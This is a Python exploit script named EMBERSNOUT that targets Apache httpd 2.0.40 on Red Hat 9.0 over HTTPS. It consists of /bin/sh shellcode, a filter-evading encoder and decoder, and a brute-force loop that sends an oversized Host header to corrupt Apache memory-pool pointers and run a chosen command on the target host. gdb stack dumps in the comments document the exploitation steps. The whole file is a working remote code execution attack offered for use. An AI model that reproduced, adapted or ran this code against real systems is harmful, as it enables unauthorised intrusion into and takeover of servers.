#!/usr/bin/env python


# EMBERSNOUT...a remote exploit against Red Hat 9.0's httpd-2.0.40-21
#              via TCP port 443 (https)

import exceptions
import httplib
import random
import socket
import string
import sys
import time

# Generic exception class, to get us out of the topmost loop, if needed...
class WhackLoopException(exceptions.Exception):
    def __init__(self, args=None):
        self.args = args
        
target_server_version_check = 'Server: Apache/2.0.40 (Red Hat Linux)';

not_vulnerable_strings = {}

# This one occurs when the 'UseCanonicalName On' directive is
#   specified, turning off inclusion of our injected hostname
#   during construction of the redirection string...8^(...
not_vulnerable_strings['UseCanonicalName On'] = \
    ('400 Bad',                                 \
     'Your browser',                            \
     'sent a request that',                     \
     'this server could not understand.',       \
     '<address>',                               \
     'Apache/2.0.40',                           \
     '</address>',                              \
     '</body>',                                 \
     '</html>')

# This one occurs when the 'Options IncludesNoExec' directive is
#   missing from the...
#       <IfModule mod_include.c>
#           <Directory "/var/www/error">
#       </IfModule>
#   ...specification set...
not_vulnerable_strings['Options IncludesNoExec'] =       \
    ('<!--#set var="TITLE" value="Bad request!" -->',    \
     '<!--#include virtual="include/top.html" -->',      \
     'Your browser (or proxy) sent a request that',      \
     'this server could not understand.',                \
     '<!--#include virtual="include/bottom.html" -->')

# Initial (pre-encoded) shellcode...
plain_cmdshellcode_front = \
    '\xeb\x22'              + \
    '\x59'                  + \
    '\x31\xc0'              + \
    '\x50'                  + \
    '\x68''//sh'            + \
    '\x68''/bin'            + \
    '\x89\xe3'              + \
    '\x50'                  + \
    '\x66\x68''-c'          + \
    '\x89\xe7'              + \
    '\x50'                  + \
    '\x51'                  + \
    '\x57'                  + \
    '\x53'                  + \
    '\x89\xe1'              + \
    '\x99'                  + \
    '\xb0\x0b'              + \
    '\xcd\x80'              + \
    '\xe8\xd9\xff\xff\xff'
    
# Some bytes of NULL to terminate the argument list...
plain_cmdshellcode_back = \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           
# shellcode thawer...
decoder_wench = \
    '\x74\x3f\x75\x3d\x8a\x1e\x80\xeb\x61\x30\xd8\x81\xc6\x02\x01\x01' + \
	'\x01\x81\xee\x01\x01\x01\x01\xc3\x8b\x34\x24\x89\xf7\x31\xc0\xe8' + \
	'\xe0\xff\xff\xff\x80\xfb\x19\x74\x1d\xc1\xe0\x04\xe8\xd3\xff\xff' + \
	'\xff\x88\x07\x81\xc7\x02\x01\x01\x01\x81\xef\x01\x01\x01\x01\xeb' + \
	'\xdc\xe8\xd2\xff\xff\xff'

# Jump us forward from start of buffer to buffer+0x30 (shellcode)...
# originally...
jump_me_baby = '\xeb\x2e\x90\x90'
jump_me_baby_length = len(jump_me_baby);

thorough_stack_offset_list = [ -0x201c, -0x200c, -0x1fec, -0x1fe8, -0x1fac, -0x1c,  0x0, 0x68, 0x98, 0xa4, 0x118, 0x124, 0x134, 0x144, 0x154, 0x164, 0x170, 0x184 ]
quick_stack_offset_list = [ 0x0 ]
attempted_whack_pool_pointers = {}

# ============================================================================
# ============= Function definitions...
# ============================================================================
def bad_address_byte(byte_to_check):
    if (byte_to_check.isupper() or (byte_to_check == chr(0x0)) or (byte_to_check == chr(0xa)) or (byte_to_check == chr(0xd))):
        return(1)
    else:
        return(0)
    
def bad_data_byte(byte_to_check):
    if ((byte_to_check == chr(0x0)) or (byte_to_check == chr(0xa)) or (byte_to_check == chr(0xd)) or \
        ((byte_to_check >= chr(0x1)) and (byte_to_check <= chr(0x30))) or \
        ((byte_to_check >= chr(0x3c)) and (byte_to_check <= chr(0x40))) or \
        ((byte_to_check >= chr(0x5b)) and (byte_to_check <= chr(0x60))) or \
        ((byte_to_check >= chr(0x7b)) and (byte_to_check <= chr(0x7e)))):
        return(1)
    else:
        return(0)
    
def bogus_ass_address_bytes(address_to_check):
    input_bytes = (chr((address_to_check >> 24) & 0xff), \
             chr((address_to_check >> 16) & 0xff), \
             chr((address_to_check >> 8) & 0xff), \
             chr(address_to_check & 0xff))
    bogus_ass_bytes = []
                 
    # Default to success...
    return_value = 0
    
    for byte_to_check in input_bytes:
        if (bad_address_byte(byte_to_check)):
            bogus_ass_bytes += byte_to_check
            return_value += 1
        
    return(return_value, bogus_ass_bytes)
    
def encoder_wench(input_string):
    # Work (in C) to arrive at this encoding/decoding scheme attributed
    encoded_string = []
                 
    input_string_length = len(input_string)
    for i in range(0, input_string_length):
        # Combining the leading/trailing nibbles with 'a'
        #   to form each successive byte of the encoded
        #   string...definitely NOT rocket science, but
        #   it gets us through the filter...which is cool...
        next_byte = ord(input_string[i])
        encoded_string += chr(0x61 + ((next_byte >> 4) & 0xf))
        encoded_string += chr(0x61 + (next_byte & 0xf))
        
    # 'z' as the terminator...
    encoded_string += chr(0x7a)
    
    return(encoded_string)
    
def usage(command_name):
    print '\n'
    print 'Usage -> %s ip port packet_size start_ebp end_ebp ebp_inc hex_pad_byte "cmd"\n' % (command_name)
    print 'where...\n'
    print '\tip............target IP address'
    print '\tport..........target httpd TCP port number (usually 443)'
    print '\tpacket_size...attack packet length in bytes'
    print '\tstart_ebp.....guessed %ebp value to start with'
    print '\tend_ebp.......guessed %ebp value to end with'
    print '\tebp_inc.......how many stack bytes to bump %ebp each time'
    print '\thex_pad_byte..packet filling byte (0x0 will do randomized fill)'
    print '\t"cmd".........ASCII command string to be executed on target'
    print '\n'
    return
        
# ============================================================================
# ============= Executable code...
# ============================================================================
print "Arguments: ", sys.argv

# ============================================================================
# ============= Argument fetching...
# ============================================================================
if (len(sys.argv) != 9):
    # BONK!!!
    usage(sys.argv[0])
    sys.exit(0)
    
server_address = sys.argv[1]
port = int(sys.argv[2], 10)
packet_size = long(sys.argv[3], 10)
whack_frame_pointer = start_address = long(sys.argv[4], 16)

# In case we need this functionality...
random_generator = random.Random(whack_frame_pointer)

# ============================================================================
# NOTE:  We find the address of the start of our (filtered) buffer to be at
#        offset 0x14 from the start of apr_pstrcat()'s frame pointer.  We're
#        going to use this address as the "apr_memnode_t *active" from the
#        bogus "apr_pool_t" structure pointed to by whack_pool_pointer.
#        "apr_memnode_t *active" is at offset 0x28 from the start of the
#        "apr_pool_t" structure, so to succeed, whack_pool_pointer needs to 
#        be 0x14 less than the frame pointer of apr_pstrcat(), so that
#        whack_pool_pointer + 0x28 gets us our buffer's start address loaded
#        as "pool->active"...8^)
#            Stack frame at 0xbfffe288:
#             eip = 0x402fa19c in apr_pstrcat; saved eip 0x8077ef7
#             called by frame at 0xbfffe2f8, caller of frame at 0xbfffe228
#             Arglist at 0xbfffe288, args:
#             Locals at 0xbfffe288, Previous frame's sp in esp
#             Saved registers:
#              ebp at 0xbfffe288, edi at 0xbfffe284, eip at 0xbfffe28c
#            (gdb) x/32xw 0xbfffe288
#            0xbfffe288:     0xbfffe2f8      0x08077ef7      0xbfffe274      0x08085dbb
#            0xbfffe298:     0x0808c9a0   ** 0x081f6038 **   0x0808bf82      0xbfffe2c0
#            0xbfffe2a8:     0x0808bf72      0x00000000      0x081d1790      0x081f7e38
#            0xbfffe2b8:     0x00000000      0x48000010      0x00333434      0x081f7e38
#            0xbfffe2c8:     0xbfffe2f8      0x081e9e28      0x50415448      0x081f5da8
#            0xbfffe2d8:     0xbfffe2f8      0x402fc718      0x081f5da8      0x08161ae5
#            0xbfffe2e8:     0x0000002d      0x081e9e28      0x0000000c      0x081f5da8
#        ...so, to hit on this target, for example...
#              0xbfffe298 --> contains desired load address for "pool->active"
#            -       0x14
#              ==========
#              0xbfffe288 --> stack frame for apr_pstrcat()
#            -       0x14
#              ==========
#              0xbfffe274 --> setting we'll need for whack_pool_pointer
# ============================================================================

end_address = long(sys.argv[5], 16)
address_increment = int(sys.argv[6], 16)
hex_pad_byte = int(sys.argv[7], 16)
plain_command_to_execute = sys.argv[8]

# ============================================================================
# ============= Shellcode prep/encode...
# ============================================================================
plain_cmdshellcode = \
    plain_cmdshellcode_front + \
    plain_command_to_execute + \
    plain_cmdshellcode_back;
plain_cmdshellcode_length = len(plain_cmdshellcode);

# Yo!!! Encoder wench!!!
encoded_shellcode = encoder_wench(plain_cmdshellcode)
encoded_shellcode_length = len(encoded_shellcode);

# Final shellcode = the decoder wench + our encoded shellcode...
final_encoded_shellcode = decoder_wench
for i in range(0, encoded_shellcode_length):
    final_encoded_shellcode += encoded_shellcode[i]
final_encoded_shellcode_length = len(final_encoded_shellcode);

# Time info
start_time = time.asctime(time.gmtime())

print "== %s ==============================================================" % (start_time)
print 'parameter  server_address.....................: %s' % (server_address)
print 'parameter  port...............................: 0x%x (%d)' % (port, port)
print 'parameter  packet_size........................: 0x%x (%d)' % (packet_size, packet_size)
print 'parameter  start_address......................: 0x%x' % (start_address)
print 'parameter  end_address........................: 0x%x' % (end_address)
print 'parameter  address_increment..................: 0x%x (%d)' % (address_increment, address_increment)
print 'parameter  hex_pad_byte.......................:',
if (hex_pad_byte == 0x0):
    # Randomize...
    print 'Somewhat RANDOM Bytes'
else:
    print '0x%x' % (hex_pad_byte)
print 'parameter  plain_command_to_execute...........: <%s>' % (plain_command_to_execute)

# Now...we want to point "pool->active->first_avail" at the start of the
#   stack pointer for memcpy(), so that we can whack memcpy()'s return
#   address directly...if we don't, we'll crash in a bit in either
#   memcpy() or strlen(), since apr_pstrcat() cruises through its
#   variable argument list a second time, and we can't get a NULL word
#   into the overwritten buffer, due to filtration...8^(
# 
# We find the stack at the point of memcpy() (who is, apparently, frameless,
#   and uses %esp for return purposes, not %ebp) to look like...
#   Dump of assembler code for function memcpy:
#   0x4207bfd0 <memcpy+0>:  mov    0xc(%esp,1),%ecx
#   0x4207bfd4 <memcpy+4>:  mov    %edi,%eax
#   0x4207bfd6 <memcpy+6>:  mov    0x4(%esp,1),%edi
#   0x4207bfda <memcpy+10>: mov    %esi,%edx
#   0x4207bfdc <memcpy+12>: mov    0x8(%esp,1),%esi
#   0x4207bfe0 <memcpy+16>: cld
#   0x4207bfe1 <memcpy+17>: shr    %ecx
#   0x4207bfe3 <memcpy+19>: jae    0x4207bfe6 <memcpy+22>
#   0x4207bfe5 <memcpy+21>: movsb  %ds:(%esi),%es:(%edi)
#   0x4207bfe6 <memcpy+22>: shr    %ecx
#   0x4207bfe8 <memcpy+24>: jae    0x4207bfec <memcpy+28>
#   0x4207bfea <memcpy+26>: movsw  %ds:(%esi),%es:(%edi)
#   0x4207bfec <memcpy+28>: repz movsl %ds:(%esi),%es:(%edi)
#   0x4207bfee <memcpy+30>: mov    %eax,%edi
#   0x4207bff0 <memcpy+32>: mov    %edx,%esi
#   0x4207bff2 <memcpy+34>: mov    0x4(%esp,1),%eax
#   0x4207bff6 <memcpy+38>: ret
#   End of assembler dump.
#   0  0x4207bfea in memcpy () at memcpy:-1
#   1  0x402fa1e6 in apr_pstrcat () from /usr/lib/libapr.so.0
#   0xbfffe22c: *** 0x402fa1e6 ***  0xbffff625      0xbfffffff      0x0000000b
#   0xbfffe23c:     0x00001390      0xbfffe2ac      0x0000000b      0x00000006
#   0xbfffe24c:     0xbfffe273      0x00000000      0x00000021      0x00001388
#   0xbfffe25c:     0x00000006      0x00000003      0x0000000b      0xbfffe288
#   0xbfffe26c:     0x0806e3b5      0x3c1d1790      0x72646461      0x3e737365
#   0xbfffe27c:     0x63617041      0x322f6568      0x342e302e      0x65532030
whack_memcpy_return_address_frame_pointer_decrement = 0x5c

# Let's divide our packet_size by 2, and also decrement back that far, to...
# 1...hopefully avoid falling off the end of the stack (some frame pointers can
#     be notably cheap/cheesy in their allocations, we've found...and
# 2...get our whack values and shellcode into the middle of the buffer...
whack_prevent_from_falling_off_stack_decrement = packet_size / 2
whack_prevent_from_falling_off_stack_decrement = packet_size - 0x100

# ... 0xbfffe288: 0x90909090...1st argument:  apr_pool_t *a
# ... 0xbfffe288: 0x08085dbb...2nd argument:  <_IO_stdin_used+2135>:         ""
# ... 0xbfffe298: 0x0808c9a0...3rd argument:  <ap_bucket_type_error+4256>:   "<address>Apache/2.0.40 Server at "
# ... 0xbfffe298: 0x081f6038...4th argument:  '\220' <repeats 200 times>...
# ... 0xbfffe298: 0x0808bf82...5th argument:  <ap_bucket_type_error+1666>:   " Port "
# ... 0xbfffe298: 0xbfffe2c0...6th argument:  "443"
# ... 0xbfffe2a8: 0x0808bf72...7th argument;  <ap_bucket_type_error+1650>:   "</address>\n"
# ... 0xbfffe2a8: 0x00000000...NULL...end of variable argument list
whack_active_first_avail_decrement = \
    len('<address>Apache/2.0.40 Server at ') + \
    len(' Port ') + \
    len('443') + \
    len('</address>\n') + \
    whack_prevent_from_falling_off_stack_decrement + \
    0x10
    # What the heck, we have the room...
    
whack_pool_pointer = long(whack_frame_pointer - 0x14)
whack_active_first_avail_pointer = whack_frame_pointer - whack_memcpy_return_address_frame_pointer_decrement

print "=========================================================================================="
print 'computed   whack_pool_pointer.................: 0x%x' % (whack_pool_pointer)
print 'original   whack_active_first_avail_pointer...: 0x%x' % (whack_active_first_avail_pointer)

whack_active_first_avail_pointer -= whack_active_first_avail_decrement
whack_active_endp_pointer = 0xbffffff0

# Program received signal SIGSEGV, Segmentation fault.
# 0xdeadbeef in ?? ()
# (gdb) ir
# eax:<0xb3b3b3b3> ecx:<0x00000000> edx:<0xbfffe208> ebx:<0x4030d508>
# esp:<0xbfffe230> ebp:<0xbfffe288> esi:<0xbfffe208> edi:<0x081f6038>
# eip:<0xdeadbeef> efl:<0x00010216>  cs:<0x00000023>  ss:<0x0000002b>
#  ds:<0x0000002b>  es:<0x0000002b>  fs:<0x00000000>  gs:<0x00000033>
# jump_vector_address = 0xdeadbeef
# Cool...8^)
# 
# Hey...how about.....0x8051d9f <data.0+134552431>:	call   *%edi
# jump_vector_address -> 0x8051d9f...the original
jump_vector_address = '\x9f\x1d\x05\x08'

# Program received signal SIGSEGV, Segmentation fault.
# 0x081f6038 in ?? ()
# (gdb) x/128xw 0x081f6038
#     0x81f6038:      0xa2a2a2a2      0xa3a3a3a3      0xa4a4a4a4      0xa5a5a5a5
#     0x81f6048:      0xbffff5a7      0xbffffff0      0xa1a1a1a1      0xa1a1a1a1
#     0x81f6058:      0xb3b3b3b3      0x08051d9f      0xb3b3b3b3      0xb3b3b3b3
#     0x81f6068:      0xb4b4b4b4      0xb4b4b4b4      0xb4b4b4b4      0xb4b4b4b4
#     0x81f6078:      0xb5b5b5b5      0xb5b5b5b5      0xb5b5b5b5      0xb5b5b5b5
# So...if we make that first word a jump $+0x30, for example, we win, starting at
# --> 0x81f6068:      0xb4b4b4b4      0xb4b4b4b4      0xb4b4b4b4      0xb4b4b4b4

print 'computed   whack_active_first_avail_pointer...: 0x%x' % (whack_active_first_avail_pointer)
print 'computed   whack_active_endp_pointer..........: 0x%x' % (whack_active_endp_pointer)
print 'computed   final_encoded_shellcode_length.....: 0x%x (%d)' % (final_encoded_shellcode_length, final_encoded_shellcode_length)
print "=========================================================================================="

we_still_think_target_is_vulnerable = 0
whack_count = whack_ungrokkable_count = keyboard_interrupt_count = probable_crash_count = total_bytes_thrown = total_bytes_received = long(0)
not_time_to_quit = 1

try:
    while (not_time_to_quit and (whack_frame_pointer <= end_address)):
        whack_time = time.asctime(time.gmtime())
        print "0x%x == %s ============================================================" % (whack_frame_pointer,whack_time)

        (bogus_ass_active_first_avail_byte_count, bogus_ass_active_first_avail_bytes) = bogus_ass_address_bytes(whack_active_first_avail_pointer)

        # Now comes the hard part...we need to take our current parameters, and generate
        #   either 1 or 18 (yes, I said 18) iterations, depending on whether or not we
        #   can pass the computed whack_active_first_avail_pointer through unfiltered
        #   (the "quick" mode), or need to generate the other 18 potential addresses
        #   to try and whack 1 of the 18 copies of the "apr_pool_t *" pointer that can 
        #   be found on the stack (the "thorough" mode)...
        # 
        # Stack 'em up...
        pool_pointer_address_stack = []
        stack_offset_list = []
        if (bogus_ass_active_first_avail_byte_count):
            # Aw, poop...Can't do a single throw...need the "thorough" mode...
            print '0x%x ---> THOROUGH attack due to %d ungrokkable whack_active_first_avail_pointer address (0x%x) byte(s):' % (whack_frame_pointer, bogus_ass_active_first_avail_byte_count, whack_active_first_avail_pointer), bogus_ass_active_first_avail_bytes
            stack_offset_list = thorough_stack_offset_list
        else:
            stack_offset_list = quick_stack_offset_list

        for stack_offset in stack_offset_list:
            # Sorry...offsets mistakenly computed based on the pool->active pointer...I know, I know,
            #   I should have done it from the computed pool pointer in each case, but you know,
            #   you only have so much time to use a graphical calculator in life, and if you
            #   want to rebalance each offset by the additional 0x28, and then use the
            #   whack_pool_pointer, please feel free...but adding in the 0x28 here gets
            #   us the correct value, go figure...
            try_pool_pointer = whack_pool_pointer + long(stack_offset)
            if (attempted_whack_pool_pointers.has_key(try_pool_pointer)):
                # Yep...tried this one already...skip around, but keep a count...
                attempted_whack_pool_pointers[try_pool_pointer] += 1
            else:
                # Nope...haven't seen this one yet...
                attempted_whack_pool_pointers[try_pool_pointer] = 1
            pool_pointer_address_stack.append(try_pool_pointer)

        # Before we start popping 'em off...reverse 'em, since we went least to greatest
        #    while adding...that way, we'll also be least to greatest while popping off...8^)
        pool_pointer_address_stack.reverse()
        pool_pointer_count = len(pool_pointer_address_stack)
        while (not_time_to_quit and len(pool_pointer_address_stack)):
            # Pop 'em off...one at a time...
            whack_pool_pointer = pool_pointer_address_stack.pop()
            print "0x%x (%02d of %02d) =============================================================================" % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
            (bogus_ass_pool_byte_count, bogus_ass_pool_bytes) = bogus_ass_address_bytes(whack_pool_pointer)
            if (bogus_ass_pool_byte_count):
                # Aw, poop...Bump the whack ungrokkable count...
                print '0x%x (%02d of %02d) ---> SKIPPING due to %d ungrokkable whack_pool_pointer address (0x%x) byte(s):' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, bogus_ass_pool_byte_count, whack_pool_pointer), bogus_ass_pool_bytes
                whack_ungrokkable_count += 1

            else:
                # FIRE IN THE HOLE!!!
                print '0x%x (%02d of %02d) ---> Throwing whack_pool_pointer: 0x%x' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, whack_pool_pointer)

                # TCP socket, please...
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Remote side tuple...
                target_address = (server_address, port)

                print '0x%x (%02d of %02d) ---> Connecting to %s via TCP port %d...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, server_address, port)
                s.connect(target_address)

                if (port == 80):
                    # sb whack...
                    msg = 'GET /manual HTTP/1.1'
                elif (port == 443):
                    msg = 'GET /index.html HTTP/1.0'
                else:
                    msg = 'GET /index.html HTTP/1.0'
                
                print "0x%x (%02d of %02d) ---> Sending: <%s>" % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, msg)
                msg += '\n'
                s.send(msg)
                total_bytes_thrown += len(msg)

                host_field = 'Host: '
                for i in range(0, packet_size):
                    if ((i >= 0x0) and (i <= 0x3)):
                        # Okay...first 0x30 bytes of our buffer are the
                        #   bogus "apr_pool_t" structure, which we hop to
                        #   via stack...
                        #   0x10...first_avail
                        #   0x14...endp
                        # 
                        # We need to jump ahead just a bit, to jump over our critical values
                        #   used at offsets 0x10, 0x14 and 0x24, to shellcode, which we're
                        #   gonna place at offset 0x30...
                        host_field += jump_me_baby[i]
                    elif ((i >= 0x4) and (i <= 0x7)):
                        # Less of a jump, by 4 bytes...
                        # 
                        # We need to jump ahead just a bit, to jump over our critical values
                        #   used at offsets 0x10, 0x14 and 0x24, to shellcode, which we're
                        #   gonna place at offset 0x30...
                        host_field += jump_me_baby[i - 0x4]
                    elif (((i >= 0x10) and (i <= 0x13)) or ((i >= 0x610) and (i <= 0x613))):
                        # char *pool->active->first_avail
                        if (i % 4 == 0):
                            host_field += chr(whack_active_first_avail_pointer & 0xff)
                        elif (i % 4 == 1):
                            host_field += chr((whack_active_first_avail_pointer >> 8) & 0xff)
                        elif (i % 4 == 2):
                            host_field += chr((whack_active_first_avail_pointer >> 16) & 0xff)
                        else:
                            host_field += chr((whack_active_first_avail_pointer >> 24) & 0xff)
                    elif (((i >= 0x14) and (i <= 0x17)) or ((i >= 0x614) and (i <= 0x617))):
                        # char *pool->active->endp
                        if (i % 4 == 0):
                            host_field += chr(whack_active_endp_pointer & 0xff)
                        elif (i % 4 == 1):
                            host_field += chr((whack_active_endp_pointer >> 8) & 0xff)
                        elif (i % 4 == 2):
                            host_field += chr((whack_active_endp_pointer >> 16) & 0xff)
                        else:
                            host_field += chr((whack_active_endp_pointer >> 24) & 0xff)
                    elif ((i >= 0x30) and (i < (0x30 + final_encoded_shellcode_length))):
                        # We want shellcode hereabouts...8^)
                        # Mom...we're home!!!
                        host_field += final_encoded_shellcode[i - 0x30]
                    elif (((i >= 0x600) and (i <= 0x603)) or ((i >= 0x620) and (i <= 0x623))):
                        # The target offset...otherwise known as our bogus pool pointer...8^)
                        if (i % 4 == 0):
                            host_field += chr(whack_pool_pointer & 0xff)
                        elif (i % 4 == 1):
                            host_field += chr((whack_pool_pointer >> 8) & 0xff)
                        elif (i % 4 == 2):
                            host_field += chr((whack_pool_pointer >> 16) & 0xff)
                        else:
                            host_field += chr((whack_pool_pointer >> 24) & 0xff)
                    # elif ((i >= 0x7d0) and (i <= 0x1387)):
                    # elif ((i >= 0x1200) and (i <= 0x1300)):
                    # elif ((i >= 0x1000) and (i <= packet_size)):
                    elif ((i >= 0x604) and (i <= packet_size)):
                        # Ass end of the packet...non-scientifically adding 0x100/4 of 'em...
                        # 
                        # Load a bunch of copies of our jump vector, in case we get any
                        #   address byte translation...We can get more precise with additional
                        #   testing at some later point...8^)
                        if (i % 4 == 0):
                            host_field += jump_vector_address[0]
                        elif (i % 4 == 1):
                            host_field += jump_vector_address[1]
                        elif (i % 4 == 2):
                            host_field += jump_vector_address[2]
                        else:
                            host_field += jump_vector_address[3]
                    else:
                        if (hex_pad_byte == 0x0):
                            # Randomizing...
                            random_pad_byte = chr(random.randint(0x1, 0xff) & 0xff)
                            while (bad_data_byte(random_pad_byte)):
                                random_pad_byte = chr(random.randint(0x1, 0xff) & 0xff)
                            host_field += random_pad_byte
                        else:
                            host_field += chr(hex_pad_byte)

                host_field += '\n'

                print '0x%x (%02d of %02d) ---> Sending: <Host> field...%d bytes' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, len(host_field))
                s.send(host_field)
                total_bytes_thrown += len(host_field)
                
                if (port == 80):
                    # sb whack...2 of 3...
                    print '0x%x (%02d of %02d) ---> Sending: <Host> field...%d bytes' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, len(host_field))
                    s.send(host_field)
                    total_bytes_thrown += len(host_field)
                    # sb whack...3 of 3...don't forget the bogus port number!!!
                    bogus_port = '64432'
                    last_host_field = host_field[:len(host_field)]
                    last_host_field += ':'
                    last_host_field += bogus_port
                    last_host_field += '\n'
                    host_field = last_host_field
                    print '0x%x (%02d of %02d) ---> Sending: <Host> field...%d bytes' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, len(host_field))
                    s.send(host_field)
                    total_bytes_thrown += len(host_field)
                    
                double_newline = '\n\n'
                print '0x%x (%02d of %02d) ---> Sending: <double newline>' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                s.send(double_newline)
                total_bytes_thrown += len(double_newline)

                try:
                    target_response = s.recv(8192)
                    if (len(target_response) == 0):
                        # Cool...looks like we whacked him, methinks...
                        print '0x%x (%02d of %02d) <--- Received: EOF on connection...no response came back!' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                        if (we_still_think_target_is_vulnerable == 0):
                            # Guess again, grasshopper...
                            we_still_think_target_is_vulnerable = 1
                            
                        probable_crash_count += 1
                    else:
                        total_bytes_received += len(target_response)
                        print '0x%x <--- Received: %d bytes of response\n%s' % (whack_frame_pointer, len(target_response), target_response)

                        if (we_still_think_target_is_vulnerable == 0):
                            # Otay...vulnerability assessment, please...
                            # 
                            # "I agree...Preparation H DOES feel good...on the whole..."
                            found_all_error_strings = {}
                            for key in not_vulnerable_strings.keys():
                                found_all_error_strings[key] = 1
                                for next_string in not_vulnerable_strings[key]:
                                    if (target_response.find(next_string) == -1):
                                        # Not found...okay, he COULD still be vulnerable...
                                        found_all_error_strings[key] = 0
                                        
                                if (found_all_error_strings[key]):
                                    # Uh-oh...he may NOT be vulnerable, 'cause he's matched
                                    #   one of our little detector string sets...
                                    print '0x%x (%02d of %02d) **** Target appears NON-VULNERABLE!!!' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                                    print '0x%x (%02d of %02d) **** Target may have --> %s <-- directive set...which would suck!!!' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, key)
                                    print '0x%x (%02d of %02d) Would you like to continue (y/n)? [Y] ' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count),
                                    response = string.lower(raw_input())
                                    if (response == ''):
                                        response = 'y'
                                    while ((response != 'y') and (response != 'n')):
                                        print '\n0x%x (%02d of %02d) Would you like to continue (y/n)? [Y] ' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count),
                                        if (response == ''):
                                            response = 'y'
                                        response = string.lower(raw_input())

                                    if (response == 'n'):
                                        # Your wish is my command...
                                        # 
                                        # Bail...Premature Exit, Y'all!!!
                                        print '\n0x%x (%02d of %02d) **** Bailing...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                                        not_time_to_quit = 0
                                        # raise WhackLoopException
                                    else:
                                        # Keep on cruising, and don't come in here again, since
                                        #   we've already been there, done that, got the $&@*#$&! T-shirt...
                                        print '\n0x%x (%02d of %02d) Continuing, as requested...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                                        we_still_think_target_is_vulnerable = 1
                                
                                # Done with this one...
                                del(found_all_error_strings[key])

                # except KeyboardInterrupt, (errno, err_string):
                #     print '0x%x (%02d of %02d) <--- Received: ERROR occurred (%d): %s' % (whack_frame_pointer. pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, errno, err_string)
                except KeyboardInterrupt:
                    keyboard_interrupt_count += 1

                    print '0x%x (%02d of %02d) (Hang: %d) Would you like to continue (y/n)? [Y] ' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, keyboard_interrupt_count),
                    response = string.lower(raw_input())
                    if (response == ''):
                        response = 'y'
                    while ((response != 'y') and (response != 'n')):
                        print '\n0x%x (%02d of %02d) (Hang: %d) Would you like to continue (y/n)? [Y] ' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count, keyboard_interrupt_count),
                        response = string.lower(raw_input())
                        if (response == ''):
                            response = 'y'

                    if (response == 'n'):
                        # Your wish is my command...Close this connection...
                        print '\n0x%x (%02d of %02d) ---> Closing...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                        s.close()

                        # Bail...Premature Exit, Y'all!!!
                        print '0x%x (%02d of %02d) **** Bailing...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                        raise WhackLoopException

                    print '\n0x%x (%02d of %02d) Continuing, as requested...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)

                except:
                    print '0x%x (%02d of %02d) **** ERROR situation occurred!' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)

                # Close this connection...
                print '0x%x (%02d of %02d) ---> Closing...' % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)
                s.close()

                # Bump the whack count...
                whack_count += 1

            print "0x%x (%02d of %02d) =============================================================================" % (whack_frame_pointer, pool_pointer_count - len(pool_pointer_address_stack), pool_pointer_count)

        # Bump our target address(es)...
        print "0x%x == %s ============================================================" % (whack_frame_pointer,whack_time)
        whack_frame_pointer += address_increment
        whack_pool_pointer = whack_frame_pointer - 0x14
        whack_active_first_avail_pointer = whack_frame_pointer - whack_memcpy_return_address_frame_pointer_decrement
        whack_active_first_avail_pointer -= whack_active_first_avail_decrement

except WhackLoopException:
    # Bailing...
    print "=========================================================================================="
    print 'Bailing as requested by user...'
    
# Pass 1...count the total number of different pool pointer values thrown...
multiple_whack_pool_pointers_computed = 0
total_whack_pool_pointers_computed = 0
for whacked_pool_pointer in attempted_whack_pool_pointers.keys():
    total_whack_pool_pointers_computed += attempted_whack_pool_pointers[whacked_pool_pointer]
    multiple_whack_pool_pointers_computed += (attempted_whack_pool_pointers[whacked_pool_pointer] - 1)



stop_time = time.asctime(time.gmtime())
print "=========================================================================================="
print 'completed  address range 0x%x-0x%x by 0x%x completed' % (start_address, end_address, address_increment)
print 'completed  whack(s) thrown....................: %d' % (whack_count)
print 'completed  whack(s) ungrokkable (filtered)....: %d' % (whack_ungrokkable_count)
print 'completed  keyboard interrupts (hung whacks?).: %d' % (keyboard_interrupt_count)
print 'completed  whack_pool_pointer values computed.: %d' % (total_whack_pool_pointers_computed)
print 'multiply computed whack_pool_pointer values...: %d' % (multiple_whack_pool_pointers_computed)
print 'completed  total whack attempts...............: %d' % (whack_count + whack_ungrokkable_count)
print 'completed  total bytes thrown.................: %d' % (total_bytes_thrown)
print 'completed  total bytes received...............: %d' % (total_bytes_received)
print 'completed  probable httpd crash count.........: %d' % (probable_crash_count)
print 'completed  start time.........................: %s' % (start_time)
print 'completed  stop time..........................: %s' % (stop_time)
print "=========================================================================================="

# Pass 2...list the multiples...
# Pass 2...list the multiples...print 'the dupe whack_pool_pointer values............'
